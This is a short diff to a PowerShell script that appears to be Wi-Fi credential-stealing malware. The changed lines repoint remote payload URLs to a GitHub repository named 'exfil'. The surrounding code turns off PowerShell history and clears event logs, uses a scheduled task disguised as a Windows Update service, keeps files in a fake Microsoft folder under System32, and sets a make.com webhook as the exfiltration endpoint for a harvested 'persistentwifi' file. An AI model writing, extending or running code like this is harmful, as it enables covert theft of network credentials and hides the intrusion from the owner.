@@ -6,7 +6,7 @@ Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
 Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
-$cleanup = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Sanitation/WifiPersistentDataReaperPurge.ps1"
+$cleanup = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Sanitation/WifiPersistentDataReaperPurge.ps1"
 $STName = "Windows Update Service For Wlan Drivers"
 
 ############### Scripts starts from here.
@@ -19,7 +19,7 @@ $regPath = "HKLM:\Software\WindowsUpdateService"
 $code = (Get-ItemProperty -Path $regPath).Code
 $basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft"
 $apiurl = "https://hook.eu2.make.com/pgvj9kxtwo4pcrhxwn1kg9p9agp129bl"
-$squidurl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/WifiRelated/WifiSquid.ps1"
+$squidurl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/WifiRelated/WifiSquid.ps1"
 $finaloutput = Join-Path -Path $basepath -ChildPath "persistentwifi-$code.txt"
 $boundary = [System.Guid]::NewGuid().ToString()
 $fileBytes = [System.IO.File]::ReadAllBytes($finaloutput)
